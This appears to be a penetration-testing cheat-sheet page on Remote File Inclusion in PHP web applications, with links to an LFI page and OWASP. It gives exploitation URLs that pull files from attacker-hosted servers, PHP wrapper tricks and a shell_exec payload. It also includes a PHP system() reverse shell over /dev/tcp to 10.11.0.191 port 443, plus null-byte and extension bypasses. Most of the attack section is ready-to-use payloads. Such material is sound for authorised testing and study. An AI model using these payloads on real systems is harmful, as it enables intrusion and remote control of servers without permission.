# Remote File Inclusion (RFI)

Remote file inclusion (RFI) is the process of including remote files through the exploiting of vulnerable inclusion procedures implemented in the application. The main difference when compared to LFI, is that RFI allows for an external URL to be injected, meaning that an attacker can include a malicious file, such as a PHP shell on their attack host.&#x20;

### Examples

#### Testing for RFI

Quick test for RFI with a PHP file, name this test.php and host using a Python server:

```php
<?php
echo "Hello";
?>
```

If we see the tags then we do not have remote code execution, however, if it says "Hello" then we have code execution.&#x20;

#### Basic Exploitation

```bash
http://localhost/index.php?page=http://someevilhost.com/test.php
```

If RFI doesn't work due to the HTTP wrapper being disabled then we can also try the following wrappers:

```bash
ftp://10.10.10.1/AnyFile
expect://ls
```

#### Obtaining a Shell

The simplest way to obtain a shell is to make a callback to the attacker server:

```bash
http://acme.com/index.php?page=http://attackerserver.com/evil.txt
```

Alternatively, the following commands can be input to a .txt file to obtain code execution:

```php
<?php echo shell_exec("whoami");?>
```

```php
<?php echo system("0<&196;exec 196<>/dev/tcp/10.11.0.191/443; sh <&196 >&196 2>&196"); ?>
```

### Notes

* As stated briefly in the [LFI section](local-file-inclusion-lfi.md#additional-notes), it is important in some situations to add a nullbyte `%00` to avoid appending `.php` or another extension like `.config`. If this does not work you can also add a `?`, to ensure that the rest will be interpreted as URL parameters.&#x20;
  * A pretty dirty way of bypassing this is also to name your file with the extension, e.g., `evil.txt.php`

### References <a href="#avoid-extentions" id="avoid-extentions"></a>

{% embed url="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion" %}
